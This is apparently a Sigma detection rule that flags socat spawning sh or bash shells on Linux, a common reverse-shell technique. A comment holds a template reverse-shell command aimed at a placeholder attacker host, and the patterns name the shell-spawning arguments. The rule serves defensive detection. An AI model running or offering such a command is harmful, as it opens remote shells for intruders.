title: Socat Reverse Shell
id: proc-lnx-socat-revshell
status: experimental
description: Detects socat used to spawn an interactive shell, a common reverse shell technique
author: EDR-Linux
date: 2026/03/08

logsource:
  category: process_creation
  product: linux

detection:
  # socat TCP:attacker:port EXEC:/bin/sh
  selection_exec_sh:
    Image|endswith: 'socat'
    CommandLine|contains: 'EXEC:/bin/sh'

  selection_exec_bash:
    Image|endswith: 'socat'
    CommandLine|contains: 'EXEC:/bin/bash'

  selection_exec_bare:
    Image|endswith: 'socat'
    CommandLine|contains:
      - 'EXEC:sh'
      - 'EXEC:bash'

  condition: 1 of selection*

level: high

tags:
  - attack.execution
  - attack.t1059.004
